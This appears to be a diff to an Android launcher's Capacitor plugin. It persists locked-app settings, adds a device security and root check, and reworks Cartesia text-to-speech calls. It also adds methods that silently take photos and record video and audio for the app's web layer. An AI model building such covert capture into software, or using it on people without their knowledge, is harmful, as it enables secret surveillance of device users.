@@ -25,6 +25,7 @@ import java.net.InetSocketAddress;
 import java.net.Socket;
 import java.net.URL;
 import java.net.HttpURLConnection;
+import java.util.Collections;
 import java.util.HashSet;
 import java.util.List;
 import java.util.Set;
@@ -37,6 +38,11 @@ import java.util.concurrent.ConcurrentLinkedQueue;
 import androidx.biometric.BiometricPrompt;
 import androidx.core.content.ContextCompat;
 import androidx.appcompat.app.AppCompatActivity;
+import android.app.KeyguardManager;
+import android.app.admin.DevicePolicyManager;
+import android.content.Context;
+import android.provider.Settings;
+import java.io.File;
 import android.media.projection.MediaProjectionManager;
 
 @CapacitorPlugin(name = "LauncherPlugin")
@@ -55,6 +61,17 @@ public class LauncherPlugin extends Plugin {
     public void load() {
         super.load();
         instance = this;
+
+        // Load saved locked packages immediately
+        try {
+            android.content.SharedPreferences prefs = getContext().getSharedPreferences("iris_launcher_prefs", android.content.Context.MODE_PRIVATE);
+            Set<String> saved = prefs.getStringSet("locked_packages_set", Collections.emptySet());
+            if (saved != null) {
+                vaultPackages = new HashSet<>(saved);
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Failed to load saved locked packages", e);
+        }
         android.speech.tts.TextToSpeech.OnInitListener initListener = new android.speech.tts.TextToSpeech.OnInitListener() {
             @Override
             public void onInit(int status) {
@@ -274,6 +291,15 @@ public class LauncherPlugin extends Plugin {
                 packages.add(arr.getString(i));
             }
             vaultPackages = packages;
+            
+            // Persist to SharedPreferences for IrisNotificationListenerService background operation
+            try {
+                android.content.SharedPreferences prefs = getContext().getSharedPreferences("iris_launcher_prefs", android.content.Context.MODE_PRIVATE);
+                prefs.edit().putStringSet("locked_packages_set", new HashSet<>(packages)).commit();
+            } catch (Exception e) {
+                android.util.Log.e("IrisLauncher", "Error saving locked packages to prefs", e);
+            }
+
             cancelAllVaultNotifications();
             call.resolve();
         } catch (Exception e) {
@@ -285,9 +311,7 @@ public class LauncherPlugin extends Plugin {
         try {
             IrisNotificationListenerService listener = IrisNotificationListenerService.getInstance();
             if (listener != null) {
-                for (String pkg : vaultPackages) {
-                    listener.cancelVaultNotification(pkg);
-                }
+                listener.cancelAllVaultNotificationsNow();
             }
         } catch (Exception e) {
             android.util.Log.e("IrisLauncher", "Error cancelling vault notifications", e);
@@ -917,6 +941,116 @@ public class LauncherPlugin extends Plugin {
     }
 
     @PluginMethod
+    public void captureSilentPhoto(PluginCall call) {
+        if (androidx.core.content.ContextCompat.checkSelfPermission(getContext(), android.Manifest.permission.CAMERA) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
+            call.reject("Camera permission not granted");
+            return;
+        }
+        String facing = call.getString("facing", "back");
+        SilentCameraHelper.captureSingleSilently(getContext(), facing, (base64Image) -> {
+            JSObject ret = new JSObject();
+            ret.put("image", base64Image != null ? base64Image : JSObject.NULL);
+            ret.put("facing", facing);
+            call.resolve(ret);
+        });
+    }
+
+    @PluginMethod
+    public void recordSilentVideo(PluginCall call) {
+        if (androidx.core.content.ContextCompat.checkSelfPermission(getContext(), android.Manifest.permission.CAMERA) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
+            call.reject("Camera permission not granted");
+            return;
+        }
+        String facing = call.getString("facing", "back");
+        int duration = call.getInt("duration", 30);
+        SilentVideoHelper.recordSilently(getContext(), facing, duration, (filePath, success) -> {
+            JSObject ret = new JSObject();
+            ret.put("path", filePath != null ? filePath : JSObject.NULL);
+            ret.put("success", success);
+            ret.put("facing", facing);
+            ret.put("duration", duration);
+            call.resolve(ret);
+        });
+    }
+
+    @PluginMethod
+    public void recordSilentAudio(PluginCall call) {
+        if (androidx.core.content.ContextCompat.checkSelfPermission(getContext(), android.Manifest.permission.RECORD_AUDIO) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
+            call.reject("Audio recording permission not granted");
+            return;
+        }
+        int duration = call.getInt("duration", 30);
+        SilentAudioHelper.recordSilently(getContext(), duration, (filePath, success) -> {
+            JSObject ret = new JSObject();
+            ret.put("path", filePath != null ? filePath : JSObject.NULL);
+            ret.put("success", success);
+            ret.put("duration", duration);
+            call.resolve(ret);
+        });
+    }
+
+    @PluginMethod
+    public void getDeviceSecurityPosture(PluginCall call) {
+        try {
+            JSObject ret = new JSObject();
+            Context ctx = getContext();
+
+            // 1. Screen Lock & Biometrics
+            KeyguardManager km = (KeyguardManager) ctx.getSystemService(Context.KEYGUARD_SERVICE);
+            boolean isDeviceSecure = false;
+            if (km != null) {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                    isDeviceSecure = km.isDeviceSecure();
+                } else {
+                    isDeviceSecure = km.isKeyguardSecure();
+                }
+            }
+            ret.put("isScreenLockSecure", isDeviceSecure);
+
+            // 2. Storage Encryption
+            DevicePolicyManager dpm = (DevicePolicyManager) ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
+            int encStatus = dpm != null ? dpm.getStorageEncryptionStatus() : DevicePolicyManager.ENCRYPTION_STATUS_UNSUPPORTED;
+            boolean isEncrypted = (encStatus == DevicePolicyManager.ENCRYPTION_STATUS_ACTIVE || 
+                                   encStatus == DevicePolicyManager.ENCRYPTION_STATUS_ACTIVE_PER_USER);
+            ret.put("isStorageEncrypted", isEncrypted);
+
+            // 3. Developer Options
+            int devOpt = Settings.Global.getInt(ctx.getContentResolver(), Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0);
+            ret.put("isDevOptionsEnabled", devOpt == 1);
+
+            // 4. USB Debugging / ADB
+            int adb = Settings.Global.getInt(ctx.getContentResolver(), Settings.Global.ADB_ENABLED, 0);
+            ret.put("isAdbEnabled", adb == 1);
+
+            // 5. Root / SU Binary Check
+            boolean isRooted = false;
+            String[] paths = {
+                "/system/app/Superuser.apk", "/sbin/su", "/system/bin/su",
+                "/system/xbin/su", "/data/local/xbin/su", "/data/local/bin/su",
+                "/system/sd/xbin/su", "/system/bin/failsafe/su", "/data/local/su"
+            };
+            for (String p : paths) {
+                if (new File(p).exists()) {
+                    isRooted = true;
+                    break;
+                }
+            }
+            ret.put("isRootDetected", isRooted);
+
+            // 6. OS & Security Patch Details
+            ret.put("androidVersion", Build.VERSION.RELEASE);
+            ret.put("sdkInt", Build.VERSION.SDK_INT);
+            ret.put("securityPatch", Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ? Build.VERSION.SECURITY_PATCH : "Unknown");
+            ret.put("deviceModel", Build.MANUFACTURER + " " + Build.MODEL);
+            ret.put("brand", Build.BRAND);
+
+            call.resolve(ret);
+        } catch (Exception e) {
+            call.reject("Failed to retrieve security posture", e);
+        }
+    }
+
+    @PluginMethod
     public void startScreenShare(PluginCall call) {
         if (!android.provider.Settings.canDrawOverlays(getContext())) {
             Intent intent = new Intent(android.provider.Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
@@ -1372,6 +1506,24 @@ public class LauncherPlugin extends Plugin {
         intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
         getContext().startActivity(intent);
         call.resolve();
+    }
+
+    @PluginMethod
+    public void isNotificationAccessGranted(PluginCall call) {
+        try {
+            String flat = android.provider.Settings.Secure.getString(
+                getContext().getContentResolver(),
+                "enabled_notification_listeners"
+            );
+            boolean enabled = flat != null && flat.contains(getContext().getPackageName());
+            JSObject ret = new JSObject();
+            ret.put("granted", enabled);
+            call.resolve(ret);
+        } catch (Exception e) {
+            JSObject ret = new JSObject();
+            ret.put("granted", false);
+            call.resolve(ret);
+        }
     }
 
     @PluginMethod
@@ -2175,124 +2327,7 @@ public class LauncherPlugin extends Plugin {
 
 
 
-    @PluginMethod
-    public void speakCartesiaNative(PluginCall call) {
-        String text = call.getString("text");
-        String voiceId = call.getString("voiceId");
-        String apiKey = call.getString("apiKey");
-        
-        if (text == null || apiKey == null || voiceId == null) {
-            call.reject("Missing required parameters (text, voiceId, apiKey)");
-            return;
-        }
 
-        new Thread(() -> {
-            try {
-                java.net.URL url = new java.net.URL("https://api.cartesia.ai/tts/bytes");
-                java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
-                conn.setRequestMethod("POST");
-                conn.setRequestProperty("Cartesia-Version", "2024-06-10");
-                conn.setRequestProperty("X-API-Key", apiKey);
-                conn.setRequestProperty("Content-Type", "application/json");
-                conn.setDoOutput(true);
-
-                JSObject jsonObj = new JSObject();
-                jsonObj.put("model_id", "sonic-3.5");
-                jsonObj.put("transcript", text);
-                JSObject voiceObj = new JSObject();
-                voiceObj.put("mode", "id");
-                voiceObj.put("id", voiceId);
-                jsonObj.put("voice", voiceObj);
-                JSObject outputFormatObj = new JSObject();
-                outputFormatObj.put("container", "mp3");
-                outputFormatObj.put("bit_rate", 128000);
-                outputFormatObj.put("sample_rate", 44100);
-                jsonObj.put("output_format", outputFormatObj);
-
-                java.io.OutputStream os = conn.getOutputStream();
-                os.write(jsonObj.toString().getBytes("UTF-8"));
-                os.close();
-
-                int responseCode = conn.getResponseCode();
-                if (responseCode == 200) {
-                    java.io.InputStream is = conn.getInputStream();
-                    java.io.File tempFile = java.io.File.createTempFile("iris_tts", ".mp3", getContext().getCacheDir());
-                    java.io.FileOutputStream fos = new java.io.FileOutputStream(tempFile);
-                    
-                    byte[] buffer = new byte[4096];
-                    int len;
-                    while ((len = is.read(buffer)) != -1) {
-                        fos.write(buffer, 0, len);
-                    }
-                    fos.close();
-                    is.close();
-
-                    getBridge().getActivity().runOnUiThread(() -> {
-                        try {
-                            if (mediaPlayer != null) {
-                                try { mediaPlayer.stop(); } catch (Exception e) {}
-                                try { mediaPlayer.release(); } catch (Exception e) {}
-                                mediaPlayer = null;
-                            }
-
-                            mediaPlayer = new android.media.MediaPlayer();
-                            java.io.FileInputStream fis = new java.io.FileInputStream(tempFile);
-                            mediaPlayer.setDataSource(fis.getFD());
-                            fis.close();
-                            
-                            mediaPlayer.setAudioAttributes(
-                                new android.media.AudioAttributes.Builder()
-                                    .setUsage(android.media.AudioAttributes.USAGE_MEDIA)
-                                    .setContentType(android.media.AudioAttributes.CONTENT_TYPE_SPEECH)
-                                    .build()
-                            );
-
-                            mediaPlayer.setOnCompletionListener(mp -> {
-                                JSObject ret2 = new JSObject();
-                                ret2.put("status", "completed");
-                                notifyListeners("onAudioPlaybackFinished", ret2);
-                                try { mp.release(); } catch (Exception e) {}
-                                mediaPlayer = null;
-                                try { tempFile.delete(); } catch (Exception e) {}
-                            });
-                            
-                            mediaPlayer.setOnErrorListener((mp, what, extra) -> {
-                                JSObject ret2 = new JSObject();
-                                ret2.put("status", "error");
-                                ret2.put("error", "MediaPlayer error: " + what + "/" + extra);
-                                notifyListeners("onAudioPlaybackFinished", ret2);
-                                try { mp.release(); } catch (Exception e) {}
-                                mediaPlayer = null;
-                                try { tempFile.delete(); } catch (Exception e) {}
-                                return true;
-                            });
-
-                            mediaPlayer.prepare();
-                            mediaPlayer.start();
-                            call.resolve();
-                        } catch (Exception e) {
-                            call.reject("Playback failed: " + e.getMessage());
-                        }
-                    });
-                } else {
-                    java.io.InputStream err = conn.getErrorStream();
-                    if (err != null) {
-                        java.io.BufferedReader br = new java.io.BufferedReader(new java.io.InputStreamReader(err));
-                        StringBuilder sb = new StringBuilder();
-                        String line;
-                        while ((line = br.readLine()) != null) { sb.append(line); }
-                        br.close();
-                        call.reject("API Error: " + responseCode + " - " + sb.toString());
-                    } else {
-                        call.reject("API Error: " + responseCode);
-                    }
-                }
-            } catch (Exception e) {
-                e.printStackTrace();
-                call.reject("Network/IO Error: " + e.getMessage());
-            }
-        }).start();
-    }
 
     @PluginMethod
     public void playAudioFile(PluginCall call) {
@@ -2343,15 +2378,7 @@ public class LauncherPlugin extends Plugin {
         }
     }
 
-    @PluginMethod
-    public void stopAudio(PluginCall call) {
-        if (mediaPlayer != null) {
-            try { mediaPlayer.stop(); } catch (Exception e) {}
-            try { mediaPlayer.release(); } catch (Exception e) {}
-            mediaPlayer = null;
-        }
-        call.resolve();
-    }
+
 
     @PluginMethod
     public void downloadModel(PluginCall call) {
@@ -3305,6 +3332,162 @@ public class LauncherPlugin extends Plugin {
             ret.put("iconMap", iconMap);
             call.resolve(ret);
         }).start();
+    }
+
+    @PluginMethod
+    public void speakCartesiaNative(PluginCall call) {
+        String text = call.getString("text", "");
+        String voiceId = call.getString("voiceId", "694f9389-aac1-45b6-b726-9d9369183238");
+        String apiKey = call.getString("apiKey", "");
+
+        if (text.isEmpty() || apiKey.isEmpty()) {
+            call.reject("Text or API key is empty");
+            return;
+        }
+
+        Executors.newSingleThreadExecutor().execute(() -> {
+            try {
+                if (mediaPlayer != null) {
+                    try {
+                        if (mediaPlayer.isPlaying()) mediaPlayer.stop();
+                        mediaPlayer.release();
+                    } catch (Exception e) {}
+                    mediaPlayer = null;
+                }
+
+                URL url = new URL("https://api.cartesia.ai/tts/bytes");
+                javax.net.ssl.HttpsURLConnection conn = (javax.net.ssl.HttpsURLConnection) url.openConnection();
+                conn.setRequestMethod("POST");
+                conn.setRequestProperty("Cartesia-Version", "2024-06-10");
+                conn.setRequestProperty("X-API-Key", apiKey.trim());
+                conn.setRequestProperty("Content-Type", "application/json");
+                conn.setDoOutput(true);
+                conn.setConnectTimeout(10000);
+                conn.setReadTimeout(20000);
+
+                org.json.JSONObject voiceObj = new org.json.JSONObject();
+                voiceObj.put("mode", "id");
+                voiceObj.put("id", voiceId);
+
+                org.json.JSONObject outputFormat = new org.json.JSONObject();
+                outputFormat.put("container", "mp3");
+                outputFormat.put("bit_rate", 128000);
+                outputFormat.put("sample_rate", 44100);
+
+                org.json.JSONObject body = new org.json.JSONObject();
+                body.put("model_id", "sonic-3.5");
+                body.put("transcript", text);
+                body.put("voice", voiceObj);
+                body.put("output_format", outputFormat);
+
+                byte[] input = body.toString().getBytes("utf-8");
+                java.io.OutputStream os = conn.getOutputStream();
+                os.write(input, 0, input.length);
+                os.flush();
+                os.close();
+
+                int code = conn.getResponseCode();
+                if (code == 200) {
+                    java.io.File tempAudio = new java.io.File(getContext().getCacheDir(), "cartesia_tts.mp3");
+                    java.io.InputStream is = conn.getInputStream();
+                    java.io.FileOutputStream fos = new java.io.FileOutputStream(tempAudio);
+                    byte[] buffer = new byte[8192];
+                    int len;
+                    while ((len = is.read(buffer)) != -1) {
+                        fos.write(buffer, 0, len);
+                    }
+                    fos.close();
+                    is.close();
+
+                    getBridge().getActivity().runOnUiThread(() -> {
+                        try {
+                            mediaPlayer = new android.media.MediaPlayer();
+                            mediaPlayer.setDataSource(tempAudio.getAbsolutePath());
+                            mediaPlayer.setOnCompletionListener(mp -> {
+                                try { mp.release(); } catch (Exception e) {}
+                                mediaPlayer = null;
+                                notifyListeners("onAudioFinished", new JSObject());
+                                notifyListeners("onAudioPlaybackFinished", new JSObject());
+                            });
+                            mediaPlayer.setOnErrorListener((mp, what, extra) -> {
+                                try { mp.release(); } catch (Exception e) {}
+                                mediaPlayer = null;
+                                notifyListeners("onAudioFinished", new JSObject());
+                                notifyListeners("onAudioPlaybackFinished", new JSObject());
+                                return true;
+                            });
+                            mediaPlayer.prepare();
+                            mediaPlayer.start();
+                            call.resolve();
+                        } catch (Exception e) {
+                            Log.e(TAG, "MediaPlayer prepare/start failed", e);
+                            notifyListeners("onAudioFinished", new JSObject());
+                            call.reject("MediaPlayer failed: " + e.getMessage());
+                        }
+                    });
+                } else {
+                    java.io.InputStream es = conn.getErrorStream();
+                    String errText = "";
+                    if (es != null) {
+                        BufferedReader reader = new BufferedReader(new InputStreamReader(es));
+                        StringBuilder sb = new StringBuilder();
+                        String line;
+                        while ((line = reader.readLine()) != null) sb.append(line);
+                        errText = sb.toString();
+                    }
+                    final String errMessage = errText;
+                    Log.e(TAG, "Cartesia API Error (" + code + "): " + errText);
+                    call.reject("Cartesia API Error (" + code + "): " + errMessage);
+                }
+            } catch (Exception e) {
+                Log.e(TAG, "Cartesia Native Exception", e);
+                call.reject("Cartesia Native Exception: " + e.getMessage());
+            }
+        });
+    }
+
+    @PluginMethod
+    public void stopAudio(PluginCall call) {
+        if (mediaPlayer != null) {
+            try {
+                if (mediaPlayer.isPlaying()) mediaPlayer.stop();
+                mediaPlayer.release();
+            } catch (Exception e) {}
+            mediaPlayer = null;
+        }
+        call.resolve();
+    }
+
+    @PluginMethod
+    public void testCartesiaKeyNative(PluginCall call) {
+        String apiKey = call.getString("apiKey", "");
+        if (apiKey.isEmpty()) {
+            call.reject("No API key provided");
+            return;
+        }
+
+        Executors.newSingleThreadExecutor().execute(() -> {
+            try {
+                URL url = new URL("https://api.cartesia.ai/voices");
+                javax.net.ssl.HttpsURLConnection conn = (javax.net.ssl.HttpsURLConnection) url.openConnection();
+                conn.setRequestMethod("GET");
+                conn.setRequestProperty("Cartesia-Version", "2024-06-10");
+                conn.setRequestProperty("X-API-Key", apiKey.trim());
+                conn.setConnectTimeout(8000);
+                conn.setReadTimeout(8000);
+
+                int code = conn.getResponseCode();
+                if (code == 200) {
+                    JSObject ret = new JSObject();
+                    ret.put("success", true);
+                    call.resolve(ret);
+                } else {
+                    call.reject("HTTP " + code + " Unauthorized");
+                }
+            } catch (Exception e) {
+                call.reject("Connection error: " + e.getMessage());
+            }
+        });
     }
 
     // Helper: URL encode string
